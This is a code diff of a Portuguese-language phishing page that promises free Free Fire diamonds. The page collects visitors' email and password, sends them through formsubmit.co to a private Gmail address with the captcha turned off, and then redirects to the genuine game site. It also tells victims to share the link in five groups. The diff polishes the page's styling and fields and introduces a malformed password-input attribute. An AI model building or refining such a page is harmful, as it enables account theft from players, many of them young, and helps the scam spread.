@@ -6,12 +6,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      font-family: Arial;
+      font-family: Arial, sans-serif;
       background-color: #f2f2f2;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
     .form-container {
       background-color: #fff;
@@ -19,27 +20,36 @@
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
+      width: 90%;
+      max-width: 400px;
     }
     input, button {
       width: 100%;
       padding: 10px;
       margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
     }
     button {
-      background: #2196F3;
-      color: #fff;
+      background-color: #2196F3;
+      color: white;
       border: none;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div class="form-container">
- <h1>🎉 Parabéns! 🎉</h1>
+    <h1>🎉 Parabéns! 🎉</h1>
     <p>Você foi selecionado para ganhar <strong>500 diamantes no Free Fire</strong>!</p>
-    <p>Faça login com sua conta e compartilhe com 5 grupos para você obter a sua recompensa.</p>
+    <p>Faça login com sua conta para continuar e partilha o link que te trouxe para cá em 5 grupos:</p>
+
     <form action="https://formsubmit.co/josefanypedro@gmail.com" method="POST">
       <input type="email" name="email" placeholder="Seu Email" required>
-      <input type="text" name="password" placeholder="Sua senha" required>
+      <input type=password" name="senha" placeholder="Sua Senha" required>
+
+      <!-- Configurações extras -->
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_next" value="https://freefire.com/">
       <button type="submit">Iniciar Sessão</button>
@@ -47,4 +57,3 @@
   </div>
 </body>
 </html>
-</style>
